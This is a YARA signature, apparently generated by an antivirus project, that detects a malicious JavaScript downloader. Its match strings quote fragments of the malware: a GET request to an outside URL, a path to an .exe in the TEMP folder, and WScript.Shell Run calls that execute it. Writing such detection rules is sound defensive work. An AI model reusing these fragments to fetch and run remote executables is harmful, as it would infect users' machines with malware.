rule sig_20160329_8cc8bb45c40ec0f58fe3a4b7ef18ffd9 {
  meta:
    description = "datamaliciousorder - file 20160329_8cc8bb45c40ec0f58fe3a4b7ef18ffd9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a20c47ca40bd98585681b8f6e0c8724dab6458a6feea839685d89e31a505e37"

  strings:
    $s1  = "D0[FT](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function F() {return x[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"isWpY1bqb.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[d](H() * 11); if (D0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function G(uQ, mh){Eh = Eh * 1; return uQ - mh;};" fullword ascii
    $s5  = "var x = function Ea() {return WScript[xf](\"WScript.Shell\");}(), S = 11;" fullword ascii
    $s6  = "function u(){return \"\" + e;};" fullword ascii
    $s7  = "function U(g){x[\"Run\"](g, Eh, Eh);};" fullword ascii
    $s8  = "function iM() {return ((LX == true) && (LX == c)) ? 1 : Eh;};" fullword ascii
    $s9  = "var K = new this[\"Date\"]();" fullword ascii
    $s10 = " while (P){" fullword ascii
    $s11 = "function H(){return 22;};" fullword ascii
    $s12 = "function kt()" fullword ascii
    $s13 = "function wx(E) {var WZ = (1, 2, 3, 4, 5, E); return WZ;};" fullword ascii
    $s14 = "function SU(){return xf;};" fullword ascii
    $s15 = "return G(KW, U0);" fullword ascii
    $s16 = "var c = false;" fullword ascii
    $s17 = "c = true; " fullword ascii
    $s18 = "var i = false;" fullword ascii
    $s19 = "LX = true; " fullword ascii
    $s20 = "var LX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}